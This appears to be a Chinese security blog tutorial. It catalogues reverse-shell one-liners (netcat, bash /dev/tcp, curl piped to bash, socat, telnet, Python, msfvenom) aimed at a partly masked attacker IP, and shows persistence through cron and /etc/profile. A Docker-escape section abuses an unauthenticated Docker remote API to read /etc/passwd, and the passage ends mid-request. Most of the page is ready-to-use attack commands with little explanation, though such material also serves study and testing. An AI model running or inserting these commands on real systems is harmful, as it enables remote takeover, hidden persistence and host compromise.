&lt;h3 id=&#34;7反弹shell补充&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7反弹shell补充&#34;&gt;#&lt;/a&gt; 7. 反弹 shell (补充)&lt;/h3&gt;
&lt;p&gt;反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。&lt;/p&gt;
&lt;p&gt;反弹 shell 通常适用于如下几种情况：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;目标机因防火墙受限，目标机器只能发送请求，不能接收请求。&lt;/p&gt;
&lt;p&gt;目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。&lt;/p&gt;
&lt;p&gt;对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1.&lt;strong&gt; 利用 netcat 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。&lt;/p&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;amp;&amp;amp; make installmake clean&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击机开启本地监听：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;netcat -lvvp &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# nc &amp;lt;攻击机&lt;span class=&#34;variable constant_&#34;&gt;IP&lt;/span&gt;&amp;gt; &amp;lt;攻击机监听的端口&amp;gt; -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netcat &lt;span class=&#34;number&#34;&gt;47.&lt;/span&gt;xxx.&lt;span class=&#34;property&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201172931760.png&#34; alt=&#34;image-20221201172931760&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 利用 Bash 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用 bash 结合重定向方法的一句话，具体命令如下：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# bash -i &amp;gt;&amp;amp; &lt;span class=&#34;regexp&#34;&gt;/dev/&lt;/span&gt;tcp/攻击机&lt;span class=&#34;variable constant_&#34;&gt;IP&lt;/span&gt;/攻击机端口 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; &lt;span class=&#34;regexp&#34;&gt;/dev/&lt;/span&gt;tcp/&lt;span class=&#34;number&#34;&gt;47.&lt;/span&gt;xxx.&lt;span class=&#34;property&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &lt;span class=&#34;string&#34;&gt;&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173007852.png&#34; alt=&#34;image-20221201173007852&#34;&gt;&lt;/p&gt;
&lt;p&gt;Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173131974.png&#34; alt=&#34;image-20221201173131974&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.Curl 配合 Bash 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并开启 2333 端口的监听。&lt;/p&gt;
&lt;p&gt;然后再目标机上执行如下，即可反弹 shell：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl &lt;span class=&#34;number&#34;&gt;47.&lt;/span&gt;xxx.&lt;span class=&#34;property&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt;|bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4. 将反弹 shell 的命令写入定时任务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹 shell 命令是要写在  &lt;code&gt;/var/spool/cron/[crontabs]/&amp;lt;username&amp;gt;&lt;/code&gt;  内的，所以必须要知道远程主机当前的用户名。否则就不能生效。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/1  *  *  *  *   /bin/bash -i&amp;gt;&amp;amp;/dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;5. 将反弹 shell 的命令写入 /etc/profile 文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/47.xxx.xxx.72/2333 0&amp;gt;&amp;amp;1 &amp;amp;  # 最后面那个&amp;amp;为的是防止管理员无法输入命令&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;6. 利用 Socat 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Socat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做 netcat 的加强版&lt;/p&gt;
&lt;p&gt;攻击机开启本地监听：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat &lt;span class=&#34;variable constant_&#34;&gt;TCP&lt;/span&gt;-&lt;span class=&#34;attr&#34;&gt;LISTEN&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; -或nc -lvvp &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机 **：**&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat tcp-&lt;span class=&#34;attr&#34;&gt;connect&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;47.&lt;/span&gt;xxx.&lt;span class=&#34;property&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;exec&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;bash -li&amp;#x27;&lt;/span&gt;,pty,stderr,setsid,sigint,sane&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;7. 利用 Telnet 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;攻击机开启本地监听：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机 **：**&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mknod a p; telnet &lt;span class=&#34;number&#34;&gt;47.&lt;/span&gt;xxx.&lt;span class=&#34;property&#34;&gt;xxx&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;lt;a | &lt;span class=&#34;regexp&#34;&gt;/bin/&lt;/span&gt;bash &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;攻击机需要开启两个本地监听 **：**&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2333nc -lvvp &lt;span class=&#34;number&#34;&gt;4000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;telnet &lt;span class=&#34;number&#34;&gt;47.101&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.57&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt; | &lt;span class=&#34;regexp&#34;&gt;/bin/&lt;/span&gt;bash | telnet &lt;span class=&#34;number&#34;&gt;47.101&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.57&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;8.&lt;strong&gt;python 反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;攻击机开启本地监听：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp &lt;span class=&#34;number&#34;&gt;2333&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接攻击机：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;47.xxx.xxx.72&amp;quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;9. 使用 msf&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODE4MDkx&#34;&gt;反弹 Shell，看这一篇就够了 - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;顺便再提一句&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201190805082.png&#34; alt=&#34;image-20221201190805082&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 bash 中是如下描述的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Bash&lt;/strong&gt; handles several filenames specially when they are used in redirections, as described in the following table:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/dev/tcp/host/port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If &lt;em&gt;host&lt;/em&gt; is a valid hostname or Internet address, and &lt;em&gt;port&lt;/em&gt; is an integer port number or service name, &lt;strong&gt;bash&lt;/strong&gt; attempts to open a TCP connection to the corresponding socket.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/dev/udp/host/port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If &lt;em&gt;host&lt;/em&gt; is a valid hostname or Internet address, and &lt;em&gt;port&lt;/em&gt; is an integer port number or service name, &lt;strong&gt;bash&lt;/strong&gt; attempts to open a UDP connection to the corresponding socket.&lt;/p&gt;
&lt;p&gt;一些文件名在重定向中被 bash 特殊处理&lt;/p&gt;
&lt;p&gt;如果主机是有效的主机名或 Internet 地址，端口是整数端口号或服务名称，bash 将尝试打开到相应套接字的 TCP/UDP 连接。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2Jhc2g=&#34;&gt;bash(1): GNU Bourne-Again SHell - Linux man page (die.net)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这其实是一种 redirection。这意味着即使要创建一个内核 &lt;code&gt;/dev/tcp&lt;/code&gt;  工具，shell 也会在 99％的时间内以交互方式屏蔽它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;bash 源码中对 /dev/tcp/ 的处理，截取出 ip、端口，建立 tcp 连接。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201191252436.png&#34; alt=&#34;image-20221201191252436&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/dev/&amp;#123;tcp|udp&amp;#125;/$&amp;#123;host&amp;#125;/$&amp;#123;port&amp;#125;&lt;/code&gt;  这个功能只在 bash 中存在，其它的 shell 如 sh、dash、zsh 中是没有的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/lyndon_li/article/details/121447208&#34;&gt;(71 条消息) /dev/tcp/&lt;em&gt;/&lt;/em&gt;_Li-Yongjun 的博客 - CSDN 博客_dev/tcp&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker-逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-逃逸&#34;&gt;#&lt;/a&gt; docker 逃逸&lt;/h2&gt;
&lt;p&gt;因为 Docker 所使用的是隔离技术，就导致了容器内的进程无法看到外面的进程，但外面的进程可以看到里面，所以如果一个容器可以访问到外面的资源，甚至是获得了宿主主机的权限，这就叫做 “Docker 逃逸”。&lt;/p&gt;
&lt;h3 id=&#34;1docker-daemon-api未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1docker-daemon-api未授权访问&#34;&gt;#&lt;/a&gt; 1.docker daemon api 未授权访问&lt;/h3&gt;
&lt;p&gt;docker swarm 是管理 docker 集群的工具。主从管理、默认通过 2375 端口通信。绑定了一个 Docker Remote API 的服务，可以通过 HTTP、Python、调用 API 来操作 Docker。&lt;/p&gt;
&lt;p&gt;在使用 docker swarm 的时候，节点上会开放一个 TCP 端口 2375，绑定在 0.0.0.0 上，如果我们使用 HTTP 的方式访问会返回 404&lt;/p&gt;
&lt;p&gt;使用如下方式启动&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。&lt;/p&gt;
&lt;p&gt;1. 首先列出所有容器，得到 id 字段&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://x.x.x.x:2375/containers/json&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 创建 exec&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /containers/&amp;lt;container_id&amp;gt;/exec HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &amp;lt;docker_host&amp;gt;:PORT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;AttachStdin&amp;quot;: true,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;AttachStdout&amp;quot;: true,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;AttachStderr&amp;quot;: true,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;Cmd&amp;quot;: [&amp;quot;cat&amp;quot;, &amp;quot;/etc/passwd&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;DetachKeys&amp;quot;: &amp;quot;ctrl-p,ctrl-q&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;Privileged&amp;quot;: true,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;Tty&amp;quot;: true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 burp 模拟 post 请求发包，得到返回的 id 参数。&lt;/p&gt;
&lt;p&gt;3、启动 exec, 成功执行了系统命令，读取到了 passwd 文件。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /exec/&amp;lt;exec_id&amp;gt;/start HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 